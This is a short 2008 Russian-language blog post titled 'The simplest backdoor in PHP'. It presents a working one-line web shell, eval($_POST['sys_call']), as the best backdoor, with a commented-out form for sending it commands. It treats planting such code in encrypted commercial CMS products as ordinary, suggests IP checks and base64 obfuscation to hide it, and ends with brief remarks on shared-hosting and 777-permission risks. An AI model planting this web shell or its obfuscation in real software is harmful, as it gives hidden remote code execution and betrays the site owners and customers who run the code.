---
title: Простейший backdoor на php
date: 2008-07-22T10:00
---

Backdoor — тайный ход, лазейка. Разумное человечество использовало всегда запасной случай что-бы не попасть впросак. К примеру те же замки, которые могли иметь по несколько тайных ходов на случай осады. В том же Гарри Поттере это придаёт много интриги сюжету, а вместе с ним и больше свободы, силы и возможностей персонажу.

В инфосистемах же лазейки нужны не только мстящим бывшим сотрудникам, влезшим через загрузку аватара хакерам, но и в обычном процессе поставки платной зашифрованной Zend'ом или IonCube'ом CMSки. Помоему самый лучший backdoor на php выглядит примерно так:

```php
eval($_POST['sys_call']);   //echo '<form method="POST"><textarea name="sys_call"></textarea><input type="submit"></form>';
```

Конечно тут могут быть вариации с проверкой IP или домена "палача", и более сложные защиты от третьих лиц. С точки зрения клиента, таким же обходным путём является функция восстановление пароля через email.

Маскировка таких бэкдоров обычно делается с помощью base64_decode с запуском [например через регулярные выражения](http://stackoverflow.com/questions/3328235/how-does-this-giant-regex-work)  

### Взломы

Не в планах было писать о взломах, но поскольку модуль статистики у меня исправный, а запросы к серверу интересные, то немогу не поделиться

Основная угроза кроме очевидных XSS и SQL injection'ов - в использовании shared-хостинга и установке прав 777 на папку. Это значит что злоумышленник может заказать такой же хостинг и получив работу на этом же сервере, будет пробовать записать что-то в эту же папку.